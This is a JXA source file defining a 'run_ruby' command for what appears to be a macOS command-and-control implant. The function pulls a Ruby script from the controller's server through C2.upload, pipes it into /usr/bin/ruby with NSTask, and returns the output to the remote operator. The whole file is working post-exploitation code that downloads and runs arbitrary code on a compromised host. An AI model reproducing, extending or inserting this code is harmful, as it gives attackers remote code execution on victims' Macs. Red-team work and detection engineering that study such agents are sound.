exports.run_ruby = function(task, command, params){
    //Parse JSON to retrieve input
    let rubyscript = "";
    try {
    let config = JSON.parse(params);
        if(config.hasOwnProperty("script")){
            let ruby_data = C2.upload(task, config['script']);
            if(typeof ruby_data === "string"){
                return{"user_output":"Failed to get contents of file", "completed": true, "status": "error"};
            }
            rubyscript = $.NSString.alloc.initWithDataEncoding(ruby_data, $.NSUTF8StringEncoding);
        }
        else{
            return {"user_output":"Need to supply a valid file to download", "completed": true, "status": "error"};
        }
        let rubyData = rubyscript.dataUsingEncoding($.NSUTF8StringEncoding);
            // Prepare NSTask
            let rubytask = $.NSTask.alloc.init;
            rubytask.setLaunchPath("/usr/bin/ruby");
            rubytask.setArguments(["-"]);
            
            // Set up input and output pipes
            const inputPipe = $.NSPipe.pipe;
            const outputPipe = $.NSPipe.pipe;
            const errorPipe = $.NSPipe.pipe;
            
            rubytask.setStandardInput(inputPipe);
            rubytask.setStandardOutput(outputPipe);
            rubytask.setStandardError(errorPipe);
            
            // Write input to the process
            const inputHandle = inputPipe.fileHandleForWriting;
            inputHandle.writeData(rubyData);
            inputHandle.closeFile;
            
            // Launch task
            rubytask.launch;  
            rubytask.waitUntilExit;
            
            // Read output
            const outputHandle = outputPipe.fileHandleForReading;
            const errorHandle = errorPipe.fileHandleForReading;
            const outputData = outputHandle.readDataToEndOfFile;
            const errorData = errorHandle.readDataToEndOfFile; 
            const outputString = $.NSString.alloc.initWithDataEncoding(outputData, $.NSUTF8StringEncoding);
            const errorString = $.NSString.alloc.initWithDataEncoding(errorData, $.NSUTF8StringEncoding);
            // Aggregate Response
            let response1 = ObjC.unwrap(outputString);
            let response2 = ObjC.unwrap(errorString);
            let response = response1 + response2;
            return {"user_output":response, "completed": true};
     }catch(error){
        return {"user_output":error.toString(), "completed": true, "status": "error"};
    }
}
